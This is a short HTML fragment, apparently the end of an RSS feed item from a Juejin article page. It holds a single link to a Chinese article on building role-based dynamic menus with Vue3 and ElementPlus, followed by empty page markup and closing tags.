<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fn1DqvgnDTFzpv9hJaudQeA" target="_blank" title="https://mp.weixin.qq.com/s/n1DqvgnDTFzpv9hJaudQeA" ref="nofollow noopener noreferrer">《Vue3 + ElementPlus 动态菜单实现：一套代码完美适配多角色权限系统》</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>